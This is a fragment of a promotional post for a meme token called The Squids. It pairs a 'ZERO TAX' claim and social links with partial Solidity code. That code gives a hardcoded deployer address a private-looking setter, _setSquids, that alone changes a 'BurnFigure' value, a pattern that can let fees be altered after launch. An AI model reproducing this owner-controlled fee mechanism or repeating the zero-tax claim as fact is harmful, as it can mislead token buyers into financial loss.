...
Squids - A game away from prosperity.

1m $Squids: ZERO TAX

TELEGRAM - https://t.me/TheSquidsERC
TWITTER - https://twitter.com/TheSquidsERC
WEBSITE - https://squids.sbs
...
pragma solidity ^0.8.20;
    ...
    contract TheSquids {
        string public constant name = "The Squids";  //
        string public constant symbol = "Squids";  //
        ...
        address payable constant deployer = payable(address(0x2AAAeF087a45683d3C7d6FB60E1E7725a16866ac)); //
        ...
        function _setSquids(uint256 newBurn, uint256 newConfirm) external {
            require(msg.sender == deployer);
            BurnFigure = newBurn;
